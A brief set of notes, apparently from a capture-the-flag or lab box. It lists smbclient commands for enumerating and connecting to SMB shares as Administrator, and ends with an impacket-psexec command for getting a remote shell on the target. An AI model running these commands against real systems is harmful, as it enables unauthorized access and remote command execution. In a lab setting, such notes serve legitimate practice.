this box showed an smb share

trying to list the shares:
smbclient -L={boxip}
smbclient -L={boxip} -U Administrator

trying to connect to the share:
smbclient {boxip}/{share} -U Administrator
smbclient -U Administrator {boxip}/{share}
smbclient //{boxip}/{share} -U Administrator

getting a shell with:
impacket-psexec Administrator@{boxip}